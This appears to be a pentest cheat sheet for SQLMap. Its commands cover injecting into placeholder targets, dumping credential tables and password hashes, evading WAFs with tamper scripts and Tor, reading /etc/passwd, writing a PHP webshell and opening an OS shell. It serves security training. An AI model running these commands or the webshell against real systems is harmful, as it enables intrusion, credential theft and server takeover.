---
title: "SQLMap Essentials"
description: "Automation, tamper scripts, --os-shell, and --dump with SQLMap."
sidebar:
  order: 4
  label: "SQLMap Essentials"
---
> SQLMap automates SQLi detection and exploitation: from fingerprinting to full dumps, file read/write, and OS shells. The Swiss Army knife of SQLi.

---


## Specifying the Request

```bash
# URL con parámetro GET
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# Petición completa desde archivo (guardada desde Burp)
sqlmap -r req.txt --batch

# POST con data inline
sqlmap -u "http://target/search.php" --data='uid=1&name=test' --batch

# Marcar parámetro inyectable con * (útil en POST)
sqlmap -u "http://target/search.php" --data='uid=1*&name=test' --batch

# Cookie
sqlmap -u "http://target/" --cookie='PHPSESSID=abc123; security=low' --batch

# Header custom
sqlmap -u "http://target/" -H 'X-Forwarded-For: 1.2.3.4' --batch

# User-Agent aleatorio
sqlmap -u "http://target/?id=1" --random-agent --batch

# Emular dispositivo móvil
sqlmap -u "http://target/?id=1" --mobile --batch

# Método HTTP no estándar
sqlmap -u "http://target/?id=1" --method PUT --batch
```

---

## Injection Types (Techniques)

| Code | Type | Description |
|--------|------|-------------|
| `B` | Boolean-based blind | Infer data using T/F response |
| `E` | Error-based | Extract data from error messages |
| `U` | UNION-based | UNION SELECT injection |
| `S` | Stacked queries | Stacked queries chained with `;` |
| `T` | Time-based blind | Infer data using SLEEP() |
| `Q` | Inline queries | Subquery in the original query |

```bash
# Forzar técnica específica (más rápido)
sqlmap -u "http://target/?id=1" --technique=BEU --batch

# Solo time-based (cuando no hay output visible)
sqlmap -u "http://target/?id=1" --technique=T --batch
```

---

## Attack Tuning

```bash
# Prefijo/sufijo para inyecciones con contexto complejo
sqlmap -u "http://target/?id=1" --prefix='%')'  --suffix='-- -' --batch

# Nivel de tests (1-5, default=1) — más nivel = más vectores
sqlmap -u "http://target/?id=1" --level=5 --batch

# Riesgo de queries (1-3, default=1) — 3 incluye UPDATE/DELETE
sqlmap -u "http://target/?id=1" --risk=3 --batch

# UNION tuning
sqlmap -u "http://target/?id=1" --union-cols=17 --batch      # forzar nº de columnas
sqlmap -u "http://target/?id=1" --union-char='a' --batch     # char de relleno
sqlmap -u "http://target/?id=1" --union-from=users --batch   # tabla FROM en el UNION

# Debug / troubleshooting
sqlmap -u "http://target/?id=1" --parse-errors --batch       # mostrar errores SQL en output
sqlmap -u "http://target/?id=1" -v 6 --batch                 # verbosidad máxima (0-6)
sqlmap -u "http://target/?id=1" -t /tmp/traffic.txt --batch  # guardar tráfico
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # ver en Burp
```

---

## Database Enumeration

```bash
# Fingerprint rápido
sqlmap -u "http://target/?id=1" --banner --current-user --current-db --is-dba --batch

# Listar todas las bases de datos
sqlmap -u "http://target/?id=1" --dbs --batch

# Listar tablas de una DB
sqlmap -u "http://target/?id=1" --tables -D testdb --batch

# Listar columnas de una tabla
sqlmap -u "http://target/?id=1" --columns -T users -D testdb --batch

# Dump completo de una tabla
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --batch

# Dump de columnas específicas
sqlmap -u "http://target/?id=1" --dump -T users -D testdb -C username,password --batch

# Dump parcial (filas 2 a 3)
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --start=2 --stop=3 --batch

# Dump con filtro WHERE
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --where="name LIKE 'admin%'" --batch

# Dump todas las DBs (excluye system DBs)
sqlmap -u "http://target/?id=1" --dump-all --exclude-sysdbs --batch

# Schema completo de la DB
sqlmap -u "http://target/?id=1" --schema --batch

# Buscar tabla por nombre
sqlmap -u "http://target/?id=1" --search -T user --batch

# Buscar columna por nombre (e.g., columnas con "pass")
sqlmap -u "http://target/?id=1" --search -C pass --batch

# Dump de hashes de contraseñas del DBMS
sqlmap -u "http://target/?id=1" --passwords --batch
```

---

## Bypassing WAF / Protections

```bash
# CSRF token — especificar el nombre del campo token
sqlmap -u "http://target/" --data="token=abc&uid=1" --csrf-token="token" --batch

# Randomizar parámetro por petición (anti-caché)
sqlmap -u "http://target/?id=1&rnd=abc" --randomize=rnd --batch

# Evaluación Python para tokens dinámicos
sqlmap -u "http://target/?id=1" --eval="import hashlib; hash=hashlib.md5(b'1').hexdigest()" --batch

# Tor + check de conectividad
sqlmap -u "http://target/?id=1" --tor --check-tor --batch

# Saltar detección automática de WAF
sqlmap -u "http://target/?id=1" --skip-waf --batch

# Chunked transfer encoding (bypass de WAF body inspection)
sqlmap -u "http://target/?id=1" --chunked --batch

# Combinar múltiples tamper scripts
sqlmap -u "http://target/?id=1" --tamper=between,randomcase --batch
sqlmap -u "http://target/?id=1" --tamper=space2comment,versionedkeywords --batch

# User-Agent de navegador real
sqlmap -u "http://target/?id=1" --random-agent --batch

# Listar todos los tamper scripts disponibles
sqlmap --list-tampers
```

### Most Useful Tamper Scripts

| Tamper | Effect | When to Use |
|--------|--------|-------------|
| `between` | `AND` → `BETWEEN 0 AND 1` | Basic WAF filters |
| `randomcase` | `SELECT` → `SeLeCt` | Case-sensitive filters |
| `space2comment` | space → `/**/` | Space filters |
| `space2plus` | space → `+` | Space filters in URL |
| `base64encode` | encodeBase64(payload) | Complete payload encoding |
| `percentage` | `S` → `%53` | WAFs that decode partially |
| `versionedkeywords` | `UNION` → `/*!UNION*/` | MySQL WAFs that filter keywords |
| `modsecurityversioned` | Combines versioned comments | ModSecurity |

---

## OS Exploitation — File Read and Write

```bash
# Verificar si somos DBA
sqlmap -u "http://target/?id=1" --is-dba --batch

# Leer archivo del servidor
sqlmap -u "http://target/?id=1" --file-read "/etc/passwd" --batch
sqlmap -u "http://target/?id=1" --file-read "/var/www/html/config.php" --batch

# Escribir webshell en el servidor
# Crear shell.php local primero:
# <?php system($_REQUEST[0]); ?>
sqlmap -u "http://target/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" \
  --batch

# Verificar: http://target/shell.php?0=id
```

---

## Interactive OS Shell

```bash
# Shell OS interactivo (requiere: DBA + FILE priv + webroot escribible)
sqlmap -u "http://target/?id=1" --os-shell --batch

# Si pregunta por webroot, especificar manualmente:
# /var/www/html/ (Apache Linux)
# C:/xampp/htdocs/ (Windows XAMPP)
# /usr/share/nginx/html/ (Nginx Linux)

# SQLMap escribe un stager PHP + UDF → interfaz shell interactiva
# Equivalente a una webshell, pero gestionada por sqlmap
```

---

## Key Flags — Quick Reference

| Flag | Description |
|------|-------------|
| `-u URL` | Target URL |
| `-r FILE` | HTTP request from file |
| `--data` | POST data |
| `--batch` | Do not ask user questions (automatic mode) |
| `--cookie` | Send custom cookie |
| `-H` | Additional header |
| `--random-agent` | Random User-Agent |
| `--level` | Test level (1-5) |
| `--risk` | Payload risk (1-3) |
| `--technique` | Techniques: BEUSTQ |
| `--prefix/--suffix` | Injection fine-tuning |
| `--tamper` | Obfuscation script(s) |
| `--proxy` | Proxy to view traffic in Burp |
| `--tor` | Use Tor network |
| `--dbs` | List databases |
| `--tables -D db` | List tables |
| `--dump -T tabla -D db` | Dump table |
| `--dump-all --exclude-sysdbs` | Complete dump without system DBs |
| `--passwords` | DBMS password hashes |
| `--is-dba` | Verify DBA privileges |
| `--file-read` | Read server file |
| `--file-write + --file-dest` | Write file to the server |
| `--os-shell` | Interactive OS shell |
| `--csrf-token` | CSRF field name |
| `--skip-waf` | Skip WAF detection |
| `--parse-errors` | Show SQL errors in output |
| `-v 6` | Maximum verbosity |
| `--list-tampers` | List available tamper scripts |

---

## Pitfalls / Gotchas

- **Always `--batch`:** without `--batch`, sqlmap stops and asks questions at every decision. In an exam, always use `--batch`.
- **`-r req.txt` from Burp:** the request must be in plaintext (Copy as `Raw`). If it has special encoding, detection may fail.
- **`--level 1 --risk 1` (default):** may fail to detect complex injections. If nothing is found with defaults, increase to `--level=5 --risk=3`.
- **UNION column mismatch:** if the app throws a column error, use `--union-cols` to force the correct number.
- **`--os-shell` without DBA:** will fail. Verify `--is-dba` before trying.
- **`--file-write` without webroot:** the file is written but will not be accessible via HTTP. Read the server configuration first to find the real webroot.
- **Non-empty `secure_file_priv`:** `--file-read` and `--file-write` will fail even if we have the FILE privilege. Modern MySQL restricts this by default.
- **WAF without tamper:** if the DB returns strange results or unexpected errors, add `--tamper=between,randomcase` as a starting point.
- **Slow `--tor`:** scans through Tor are very slow. Only for real evasion; in a lab environment use `--proxy` to redirect to Burp.
- **Charset in `--union-char`:** defaults to `NULL`. If the app filters NULL, change to a character: `--union-char='a'`.
- **`--dump` hashes automatically:** if it finds hashes in `password` fields, sqlmap offers to crack them using a dictionary. Answer yes or pass `--batch` (auto-yes).
- **`--search -C pass`:** searches for columns containing "pass" in their name across the entire DB. Extremely useful for finding credential tables without knowing the schema.

---

## Related Cheatsheets

- [SQL Injection Fundamentals](/en/metodologias/web/sql-injection-fundamentals/) — manual SQLi before automating with sqlmap
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting requests to save them in req.txt
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — alternative webshells post-exploitation of SQLi
- [File Transfers](/en/metodologias/privesc/file-transfers/) — exfiltrating data from the server after compromising via SQLi
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — cracking hashes extracted with --passwords or --dump
